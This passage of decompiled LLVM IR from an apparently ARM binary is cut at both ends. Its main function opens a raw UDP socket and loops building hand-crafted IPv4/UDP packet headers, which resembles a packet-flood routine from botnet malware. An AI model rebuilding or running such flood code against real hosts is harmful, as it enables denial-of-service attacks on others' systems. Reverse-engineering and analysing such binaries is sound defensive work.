  uselistorder i8 %v5_cd58, { 0, 2, 1 }
  uselistorder i32 %v3_cd44, { 1, 0 }
  uselistorder i32 %v1_cd34, { 2, 3, 0, 1 }
  uselistorder i32 %v1_cd30, { 1, 2, 0 }
  uselistorder i32 %v1_cd28, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_cd20, { 1, 0 }
  uselistorder i32 %v1_ccf8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_ccd8, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v3_ccd4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ccc0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_ccb8, { 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ccb4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_ccb0, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v3_cca4, { 3, 1, 2, 0 }
  uselistorder i32 %v3_cc60, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 %v6_cc4c, { 1, 0, 6, 4, 5, 3, 2 }
  uselistorder i32 %v1_cc38, { 3, 1, 2, 4, 0 }
  uselistorder i32 %v1_cbc4, { 1, 2, 0 }
  uselistorder i32 %v6_cb98, { 2, 1, 3, 0 }
  uselistorder i32 %v6_cb5c, { 2, 1, 3, 0 }
  uselistorder i32 %v4_cb44, { 0, 3, 1, 5, 2, 4, 6 }
  uselistorder i32 %v1_cb28, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14, 13 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 51, 53, 52, 55, 54, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 9, 8, 11, 10, 12, 13, 14, 16, 15, 18, 17, 19, 21, 20, 27, 22, 23, 24, 25, 26, 32, 28, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32 (i8*)* @function_f844, { 0, 1, 2, 3, 9, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 240, { 1, 0 }
  uselistorder label %dec_label_pc_d08c, { 1, 0 }
  uselistorder label %dec_label_pc_d074, { 1, 0 }
  uselistorder label %dec_label_pc_cee8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ce70, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
}

define i32 @function_d1b0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d1b0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_d1b0 = load i32, i32* @r4, align 4
  %v6_d1b0 = load i32, i32* @r5, align 4
  %v9_d1b0 = load i32, i32* @r6, align 4
  %v12_d1b0 = load i32, i32* @r7, align 4
  %v1_d1b4 = urem i32 %arg1, 256
  store i32 %v1_d1b4, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @sl, align 4
  %v1_d1c8 = urem i32 %arg3, 256
  store i32 %v1_d1c8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v2_d1d0 = call i32* @calloc(i32 %v1_d1b4, i32 4)
  %v4_d1d0 = ptrtoint i32* %v2_d1d0 to i32
  %v0_d1d4 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d1e0 = load i32, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d1e8 = inttoptr i32 %v0_d1d4 to i32*
  %v6_d1e8 = call i32 @function_930c(i32 %v0_d1e0, i32* %v5_d1e8, i32 2, i32 0, i32 %v4_d1d0)
  %v1_d1f4 = urem i32 %v6_d1e8, 256
  store i32 %v1_d1f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  %v0_d204 = load i32, i32* @r5, align 4
  %v5_d208 = trunc i32 %v6_d1e8 to i8
  %v6_d20c = inttoptr i32 %v0_d204 to i32*
  %v7_d20c = call i32 @function_930c(i32 %v0_d200, i32* %v6_d20c, i32 3, i32 65535, i32 %v6_d1e8)
  %v0_d210 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_d20c, i32* @r7, align 4
  %v0_d220 = load i32, i32* @r4, align 4
  %v5_d224 = inttoptr i32 %v0_d210 to i32*
  %v6_d224 = call i32 @function_930c(i32 %v0_d220, i32* %v5_d224, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_d22c = urem i32 %v6_d224, 256
  store i32 %v1_d22c, i32* %ip.global-to-local, align 4
  %v0_d230 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d23c = load i32, i32* @r4, align 4
  %v5_d240 = trunc i32 %v6_d224 to i8
  %v6_d244 = inttoptr i32 %v0_d230 to i32*
  %v7_d244 = call i32 @function_930c(i32 %v0_d23c, i32* %v6_d244, i32 5, i32 0, i32 %v6_d224)
  %v1_d250 = urem i32 %v7_d244, 256
  store i32 %v1_d250, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d25c = load i32, i32* @r4, align 4
  %v0_d260 = load i32, i32* @r5, align 4
  %v5_d268 = inttoptr i32 %v0_d260 to i32*
  %v6_d268 = call i32 @function_930c(i32 %v0_d25c, i32* %v5_d268, i32 6, i32 65535, i32 %v1_d250)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d278 = load i32, i32* @r5, align 4
  store i32 %v6_d268, i32* @r6, align 4
  %v0_d280 = load i32, i32* @r4, align 4
  %v5_d284 = inttoptr i32 %v0_d278 to i32*
  %v6_d284 = call i32 @function_930c(i32 %v0_d280, i32* %v5_d284, i32 7, i32 27015, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d284, i32* @r4, align 4
  %v1_d290 = call i32 @function_11394(i32 23)
  %v3_d29c = call i32 @function_112b0(i32 23, i32* nonnull %stack_var_-44)
  store i32 %v3_d29c, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d2b0 = call i32 @socket(i32 2, i32 3, i32 17)
  %v2_d2b4 = icmp eq i32 %v3_d2b0, -1
  store i1 %v2_d2b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d2b0, i32* %fp.global-to-local, align 4
  br i1 %v2_d2b4, label %dec_label_pc_d668, label %dec_label_pc_d2c0

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d1b0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d2c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d2c8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d2dc = call i32 @setsockopt(i32 0, i32 3, i32 %v6_d2c8, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v2_d2e0 = icmp eq i32 %v6_d2dc, -1
  store i1 %v2_d2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d2e0, label %dec_label_pc_d660, label %dec_label_pc_d2e8

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d2c0
  %v0_d2e8 = load i32, i32* @r4, align 4
  %v3_d2e8 = mul i32 %v0_d2e8, 65536
  store i32 %v3_d2e8, i32* %lr.global-to-local, align 4
  %v0_d2ec = load i32, i32* @r7, align 4
  %v0_d2f0 = load i32, i32* @r6, align 4
  %v3_d2f0 = mul i32 %v0_d2f0, 65536
  store i32 %v3_d2f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d2f8 = urem i32 %v0_d2ec, 65536
  %v3_d2fc = urem i32 %v0_d2f0, 65536
  store i32 %v3_d2fc, i32* %r2.global-to-local, align 4
  %v3_d300 = urem i32 %v0_d2e8, 65536
  store i32 %v3_d300, i32* %r3.global-to-local, align 4
  %v0_d304 = load i32, i32* %sb.global-to-local, align 4
  %v2_d304 = icmp eq i32 %v0_d304, 0
  store i1 %v2_d304, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp51 = icmp slt i32 %v0_d304, 1
  br i1 %tmp51, label %dec_label_pc_d488, label %dec_label_pc_d31c

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d2e8
  %v1_d320 = urem i32 %v0_d2e8, 256
  %v1_d324 = urem i32 %v0_d2f0, 256
  %v1_d328 = urem i32 %v0_d2ec, 256
  %v3_d32c = mul nuw nsw i32 %v1_d324, 256
  %v3_d330 = mul nuw nsw i32 %v1_d320, 256
  %tmp52 = udiv i32 %v0_d2ec, 256
  %v3_d334 = urem i32 %tmp52, 256
  %v4_d338 = mul nuw nsw i32 %v1_d328, 256
  %v5_d338 = or i32 %v4_d338, %v3_d334
  store i32 %v5_d338, i32* %r7.global-to-local, align 4
  %tmp53 = udiv i32 %v0_d2e8, 256
  %v4_d33c = urem i32 %tmp53, 256
  %v5_d33c = or i32 %v4_d33c, %v3_d330
  store i32 %v5_d33c, i32* %r5.global-to-local, align 4
  %tmp54 = udiv i32 %v0_d2f0, 256
  %v4_d340 = urem i32 %tmp54, 256
  %v5_d340 = or i32 %v4_d340, %v3_d32c
  store i32 %v5_d340, i32* %r6.global-to-local, align 4
  store i32 %v1_d324, i32* %r2.global-to-local, align 4
  store i32 %v1_d320, i32* %r3.global-to-local, align 4
  %v2_d3bc = icmp eq i32 %v1_d250, 0
  %sext = mul i32 %v0_d2ec, 16777216
  %v4_d3dc = sdiv i32 %sext, 16777216
  %sext7 = mul i32 %v0_d2f0, 16777216
  %v4_d438 = sdiv i32 %sext7, 16777216
  %sext8 = mul i32 %v0_d2e8, 16777216
  %v4_d458 = sdiv i32 %sext8, 16777216
  br label %dec_label_pc_d35c

dec_label_pc_d35c:                                ; preds = %bb58, %dec_label_pc_d31c
  %v2_d364 = call i32* @calloc(i32 128, i32 1)
  %v4_d364 = ptrtoint i32* %v2_d364 to i32
  store i32 %v4_d1d0, i32* %r2.global-to-local, align 4
  %v3_d36c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d36c, i32* %r3.global-to-local, align 4
  %v2_d370 = load i32, i32* @r4, align 4
  %v5_d370 = mul i32 %v2_d370, 4
  %v6_d370 = add i32 %v5_d370, %v4_d1d0
  %v7_d370 = inttoptr i32 %v6_d370 to i32*
  store i32 %v4_d364, i32* %v7_d370, align 4
  %v0_d374 = load i32, i32* %r2.global-to-local, align 4
  %v1_d374 = load i32, i32* %r3.global-to-local, align 4
  %v4_d374 = mul i32 %v1_d374, 4
  %v5_d374 = add i32 %v4_d374, %v0_d374
  %v6_d374 = inttoptr i32 %v5_d374 to i32*
  %v7_d374 = load i32, i32* %v6_d374, align 4
  store i32 %v7_d374, i32* %lr.global-to-local, align 4
  %v1_d378 = inttoptr i32 %v7_d374 to i8*
  %v2_d378 = load i8, i8* %v1_d378, align 1
  %tmp = urem i8 %v2_d378, 16
  %v1_d37c = zext i8 %tmp to i32
  %v1_d380 = or i32 %v1_d37c, 64
  store i32 %v1_d380, i32* %r3.global-to-local, align 4
  %v1_d384 = trunc i32 %v1_d380 to i8
  store i8 %v1_d384, i8* %v1_d378, align 1
  %v0_d388 = load i32, i32* %lr.global-to-local, align 4
  %v1_d388 = inttoptr i32 %v0_d388 to i8*
  %v2_d388 = load i8, i8* %v1_d388, align 1
  %v1_d38c = and i8 %v2_d388, -16
  %v1_d390 = or i8 %v1_d38c, 5
  store i8 %v1_d390, i8* %v1_d388, align 1
  %v2_d39c = load i32, i32* %lr.global-to-local, align 4
  %v3_d39c = add i32 %v2_d39c, 1
  %v4_d39c = inttoptr i32 %v3_d39c to i8*
  store i8 %v5_d208, i8* %v4_d39c, align 1
  %v3_d3a0 = load i32, i32* %stack_var_-44, align 4
  %v1_d3a4 = add i32 %v3_d3a0, 32
  %tmp55 = mul i32 %v1_d3a4, 256
  %v1_d3b0 = and i32 %tmp55, 65280
  %tmp56 = udiv i32 %v1_d3a4, 256
  %v4_d3b4 = urem i32 %tmp56, 256
  %v5_d3b4 = or i32 %v4_d3b4, %v1_d3b0
  store i32 %v5_d3b4, i32* %r2.global-to-local, align 4
  store i1 %v2_d3bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v6_d224, i32* %r3.global-to-local, align 4
  %v2_d3c4 = load i32, i32* %lr.global-to-local, align 4
  %v3_d3c4 = add i32 %v2_d3c4, 8
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i8*
  store i8 %v5_d240, i8* %v4_d3c4, align 1
  %v0_d3c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d35c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d3cc = load i32, i32* %lr.global-to-local, align 4
  %v4_d3cc = add i32 %v3_d3cc, 6
  %v5_d3cc = inttoptr i32 %v4_d3cc to i8*
  store i8 64, i8* %v5_d3cc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d35c, %bb
  %v0_d3d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3d0 = trunc i32 %v0_d3d0 to i8
  %v2_d3d0 = load i32, i32* %lr.global-to-local, align 4
  %v3_d3d0 = add i32 %v2_d3d0, 2
  %v4_d3d0 = inttoptr i32 %v3_d3d0 to i8*
  store i8 %v1_d3d0, i8* %v4_d3d0, align 1
  %v0_d3d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d3d4 = sdiv i32 %v0_d3d4, 256
  store i32 %v3_d3d4, i32* %ip.global-to-local, align 4
  store i32 %v4_d3dc, i32* %r2.global-to-local, align 4
  %v2_d3e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_d3e0 = add i32 %v2_d3e0, 9
  %v4_d3e0 = inttoptr i32 %v3_d3e0 to i8*
  store i8 17, i8* %v4_d3e0, align 1
  store i32 ptrtoint (i32* @global_var_1a714.104 to i32), i32* %r3.global-to-local, align 4
  %v0_d3e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d3e8 = trunc i32 %v0_d3e8 to i8
  %v2_d3e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_d3e8 = add i32 %v2_d3e8, 5
  %v4_d3e8 = inttoptr i32 %v3_d3e8 to i8*
  store i8 %v1_d3e8, i8* %v4_d3e8, align 1
  %v0_d3ec = load i32, i32* %ip.global-to-local, align 4
  %v1_d3ec = trunc i32 %v0_d3ec to i8
  %v2_d3ec = load i32, i32* %lr.global-to-local, align 4
  %v3_d3ec = add i32 %v2_d3ec, 3
  %v4_d3ec = inttoptr i32 %v3_d3ec to i8*
  store i8 %v1_d3ec, i8* %v4_d3ec, align 1
  %v0_d3f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d3f0, label %.thread9, label %bb57

.thread9:                                         ; preds = %.thread
  %v3_d3f410 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3f410, i32* %ip.global-to-local, align 4
  br label %bb58

bb57:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d3f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d3f4, i32* %ip.global-to-local, align 4
  %v3_d3f8 = load i32, i32* %lr.global-to-local, align 4
  %v4_d3f8 = add i32 %v3_d3f8, 7
  %v5_d3f8 = inttoptr i32 %v4_d3f8 to i8*
  store i8 0, i8* %v5_d3f8, align 1
  %v0_d400.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %.thread9, %bb57
  %v0_d400 = phi i32 [ %v3_d3f410, %.thread9 ], [ %v0_d400.pre, %bb57 ]
  %v2_d3fc = load i32, i32* @global_var_1a714.104, align 4
  store i32 %v2_d3fc, i32* %r2.global-to-local, align 4
  %v3_d400 = mul i32 %v0_d400, 32
  store i32 %v3_d400, i32* %r3.global-to-local, align 4
  %v1_d404 = load i32, i32* %lr.global-to-local, align 4
  %v2_d404 = add i32 %v1_d404, 12
  %v3_d404 = inttoptr i32 %v2_d404 to i32*
  store i32 %v2_d3fc, i32* %v3_d404, align 4
  %v0_d408 = load i32, i32* %r3.global-to-local, align 4
  %v1_d408 = load i32, i32* %ip.global-to-local, align 4
  %tmp61 = mul i32 %v1_d408, -8
  %v5_d408 = add i32 %v0_d408, %tmp61
  %v1_d40c = load i32, i32* @sl, align 4
  %v2_d40c = add i32 %v5_d408, %v1_d40c
  store i32 %v2_d40c, i32* %r3.global-to-local, align 4
  %v1_d410 = add i32 %v2_d40c, 16
  %v2_d410 = inttoptr i32 %v1_d410 to i32*
  %v3_d410 = load i32, i32* %v2_d410, align 4
  %v1_d414 = load i32, i32* %lr.global-to-local, align 4
  %v2_d414 = add i32 %v1_d414, 16
  %v3_d414 = inttoptr i32 %v2_d414 to i32*
  store i32 %v3_d410, i32* %v3_d414, align 4
  %v3_d418 = load i32, i32* %stack_var_-44, align 4
  %v1_d41c = add i32 %v3_d418, 12
  %tmp59 = mul i32 %v1_d41c, 256
  %v1_d42c = and i32 %tmp59, 65280
  %tmp60 = udiv i32 %v1_d41c, 256
  %v4_d430 = urem i32 %tmp60, 256
  %v5_d430 = or i32 %v4_d430, %v1_d42c
  store i32 %v5_d430, i32* %ip.global-to-local, align 4
  %v1_d434 = load i32, i32* %lr.global-to-local, align 4
  %v2_d434 = add i32 %v1_d434, 28
  %v3_d434 = inttoptr i32 %v2_d434 to i32*
  store i32 -1, i32* %v3_d434, align 4
  store i32 %v4_d438, i32* %r2.global-to-local, align 4
  %v0_d43c = load i32, i32* %lr.global-to-local, align 4
  %v1_d43c = add i32 %v0_d43c, 20
  store i32 %v1_d43c, i32* %r4.global-to-local, align 4
  %v0_d440 = load i32, i32* %ip.global-to-local, align 4
  %v3_d440 = sdiv i32 %v0_d440, 256
  store i32 %v3_d440, i32* %r3.global-to-local, align 4
  %v0_d444 = load i32, i32* %r7.global-to-local, align 4
  %v1_d444 = trunc i32 %v0_d444 to i8
  %v3_d444 = add i32 %v0_d43c, 4
  %v4_d444 = inttoptr i32 %v3_d444 to i8*
  store i8 %v1_d444, i8* %v4_d444, align 1
  %v0_d448 = load i32, i32* %r6.global-to-local, align 4
  %v1_d448 = trunc i32 %v0_d448 to i8
  %v2_d448 = load i32, i32* %lr.global-to-local, align 4
  %v3_d448 = add i32 %v2_d448, 20
  %v4_d448 = inttoptr i32 %v3_d448 to i8*
  store i8 %v1_d448, i8* %v4_d448, align 1
  %v0_d44c = load i32, i32* %r3.global-to-local, align 4
  %v1_d44c = trunc i32 %v0_d44c to i8
  %v2_d44c = load i32, i32* %r4.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 5
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  %v0_d450 = load i32, i32* %r5.global-to-local, align 4
  %v1_d450 = trunc i32 %v0_d450 to i8
  %v2_d450 = load i32, i32* %r4.global-to-local, align 4
  %v3_d450 = add i32 %v2_d450, 2
  %v4_d450 = inttoptr i32 %v3_d450 to i8*
  store i8 %v1_d450, i8* %v4_d450, align 1
  %v0_d454 = load i32, i32* %r2.global-to-local, align 4
  %v1_d454 = trunc i32 %v0_d454 to i8
  %v2_d454 = load i32, i32* %r4.global-to-local, align 4
  %v3_d454 = add i32 %v2_d454, 1
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v1_d454, i8* %v4_d454, align 1
  store i32 %v4_d458, i32* %r3.global-to-local, align 4
  %v0_d45c = load i32, i32* %ip.global-to-local, align 4
  %v1_d45c = trunc i32 %v0_d45c to i8
  %v2_d45c = load i32, i32* %r4.global-to-local, align 4
  %v3_d45c = add i32 %v2_d45c, 4
  %v4_d45c = inttoptr i32 %v3_d45c to i8*
  store i8 %v1_d45c, i8* %v4_d45c, align 1
  %v0_d460 = load i32, i32* %r3.global-to-local, align 4
  %v1_d460 = trunc i32 %v0_d460 to i8
  %v2_d460 = load i32, i32* %r4.global-to-local, align 4
  %v3_d460 = add i32 %v2_d460, 3
  %v4_d460 = inttoptr i32 %v3_d460 to i8*
  store i8 %v1_d460, i8* %v4_d460, align 1
  %v0_d464 = load i32, i32* %r8.global-to-local, align 4
  %v0_d468 = load i32, i32* %lr.global-to-local, align 4
  %v1_d468 = add i32 %v0_d468, 32
  %v3_d46c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d46c, i32* %r2.global-to-local, align 4
  %v3_d470 = call i32 @function_11a58(i32 %v1_d468, i32 %v0_d464, i32 %v3_d46c)
  %v3_d474 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d474, i32* %r3.global-to-local, align 4
  %v1_d478 = add i32 %v3_d474, 1
  store i32 %v1_d478, i32* @r4, align 4
  %v1_d47c = load i32, i32* %sb.global-to-local, align 4
  %v9_d47c = icmp eq i32 %v1_d478, %v1_d47c
  store i1 %v9_d47c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d478, i32* %stack_var_-40, align 4
  %v5_d484 = icmp slt i32 %v1_d478, %v1_d47c
  br i1 %v5_d484, label %dec_label_pc_d35c, label %dec_label_pc_d488

dec_label_pc_d488:                                ; preds = %bb58, %dec_label_pc_d2e8
  %v0_d488 = phi i32 [ %v0_d304, %dec_label_pc_d2e8 ], [ %v1_d47c, %bb58 ]
  %v2_d488 = icmp eq i32 %v0_d488, 0
  store i1 %v2_d488, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d4d0 = icmp eq i32 %v3_d2f8, 65535
  br label %dec_label_pc_d490.outer

dec_label_pc_d490.outer:                          ; preds = %dec_label_pc_d5a0, %dec_label_pc_d488
  %v1_d490.ph.in = phi i32 [ %v1_d594, %dec_label_pc_d5a0 ], [ %v0_d488, %dec_label_pc_d488 ]
  %v0_d490.ph = phi i1 [ %v2_d5a0, %dec_label_pc_d5a0 ], [ %v2_d488, %dec_label_pc_d488 ]
  %v1_d490.ph = icmp slt i32 %v1_d490.ph.in, 0
  %v4_d490 = or i1 %v1_d490.ph, %v0_d490.ph
  br label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %dec_label_pc_d490.outer, %dec_label_pc_d490
  br i1 %v4_d490, label %dec_label_pc_d490, label %dec_label_pc_d494

dec_label_pc_d494:                                ; preds = %dec_label_pc_d490
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d4f0, %dec_label_pc_d494
  %v1_d4b4 = phi i32 [ %v1_d590, %dec_label_pc_d4f0 ], [ 0, %dec_label_pc_d494 ]
  %v5_d4a4 = mul i32 %v1_d4b4, 24
  %v1_d4a8 = load i32, i32* @sl, align 4
  %v2_d4a8 = add i32 %v1_d4a8, %v5_d4a4
  store i32 %v2_d4a8, i32* %r3.global-to-local, align 4
  %v1_d4b0 = add i32 %v2_d4a8, 20
  %v2_d4b0 = inttoptr i32 %v1_d4b0 to i8*
  %v3_d4b0 = load i8, i8* %v2_d4b0, align 1
  %v4_d4b0 = zext i8 %v3_d4b0 to i32
  store i32 %v4_d4b0, i32* %r2.global-to-local, align 4
  %v4_d4b4 = mul i32 %v1_d4b4, 4
  %v5_d4b4 = add i32 %v4_d4b4, %v4_d1d0
  %v6_d4b4 = inttoptr i32 %v5_d4b4 to i32*
  %v7_d4b4 = load i32, i32* %v6_d4b4, align 4
  store i32 %v7_d4b4, i32* @r5, align 4
  %v7_d4bc = icmp eq i8 %v3_d4b0, 31
  store i1 %v7_d4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_d4c4 = add i32 %v7_d4b4, 20
  store i32 %v1_d4c4, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_d4b0, 32
  br i1 %tmp62, label %dec_label_pc_d5ac, label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4a0
  store i32 %v3_d2f8, i32* %r2.global-to-local, align 4
  store i1 %v3_d4d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d4d0, label %dec_label_pc_d614, label %dec_label_pc_d4d8

dec_label_pc_d4d8:                                ; preds = %dec_label_pc_d5ac.dec_label_pc_d4d8_crit_edge, %dec_label_pc_d4cc
  %v1_d4dc = phi i32 [ %v1_d4dc.pre, %dec_label_pc_d5ac.dec_label_pc_d4d8_crit_edge ], [ 65535, %dec_label_pc_d4cc ]
  store i32 %v3_d2fc, i32* %r3.global-to-local, align 4
  %v9_d4dc = icmp eq i32 %v3_d2fc, %v1_d4dc
  store i1 %v9_d4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4dc, label %dec_label_pc_d630, label %dec_label_pc_d4e4

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d614.dec_label_pc_d4e4_crit_edge, %dec_label_pc_d4d8
  %v1_d4e8 = phi i32 [ %v1_d4e8.pre, %dec_label_pc_d614.dec_label_pc_d4e4_crit_edge ], [ %v1_d4dc, %dec_label_pc_d4d8 ]
  %v9_d4e8 = icmp eq i32 %v3_d300, %v1_d4e8
  store i1 %v9_d4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4e8, label %dec_label_pc_d64c, label %dec_label_pc_d4f0

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d630, %dec_label_pc_d4e4, %dec_label_pc_d64c
  %v0_d4f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_d4f4 = trunc i32 %v0_d4f4 to i8
  %v2_d4f4 = load i32, i32* @r5, align 4
  %v3_d4f4 = add i32 %v2_d4f4, 10
  %v4_d4f4 = inttoptr i32 %v3_d4f4 to i8*
  store i8 %v1_d4f4, i8* %v4_d4f4, align 1
  %v0_d4f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_d4f8 = trunc i32 %v0_d4f8 to i8
  %v2_d4f8 = load i32, i32* @r5, align 4
  %v3_d4f8 = add i32 %v2_d4f8, 11
  %v4_d4f8 = inttoptr i32 %v3_d4f8 to i8*
  store i8 %v1_d4f8, i8* %v4_d4f8, align 1
  %v0_d4fc = load i32, i32* @r5, align 4
  store i32 %v0_d4fc, i32* @r0, align 4
  %v2_d500 = call i32 @function_de24(i32 %v0_d4fc, i32 20)
  %v3_d500 = trunc i32 %v2_d500 to i8
  %v4_d504 = sdiv i32 %v2_d500, 256
  store i32 %v4_d504, i32* %r3.global-to-local, align 4
  %v1_d508 = trunc i32 %v4_d504 to i8
  %v2_d508 = load i32, i32* @r5, align 4
  %v3_d508 = add i32 %v2_d508, 11
  %v4_d508 = inttoptr i32 %v3_d508 to i8*
  store i8 %v1_d508, i8* %v4_d508, align 1
  %v3_d50c = load i32, i32* @r5, align 4
  %v4_d50c = add i32 %v3_d50c, 10
  %v5_d50c = inttoptr i32 %v4_d50c to i8*
  store i8 %v3_d500, i8* %v5_d50c, align 1
  %v0_d510 = load i32, i32* %r8.global-to-local, align 4
  %v1_d510 = trunc i32 %v0_d510 to i8
  %v2_d510 = load i32, i32* @r6, align 4
  %v3_d510 = add i32 %v2_d510, 6
  %v4_d510 = inttoptr i32 %v3_d510 to i8*
  store i8 %v1_d510, i8* %v4_d510, align 1
  %v0_d514 = load i32, i32* %r8.global-to-local, align 4
  %v1_d514 = trunc i32 %v0_d514 to i8
  %v2_d514 = load i32, i32* @r6, align 4
  %v3_d514 = add i32 %v2_d514, 7
  %v4_d514 = inttoptr i32 %v3_d514 to i8*
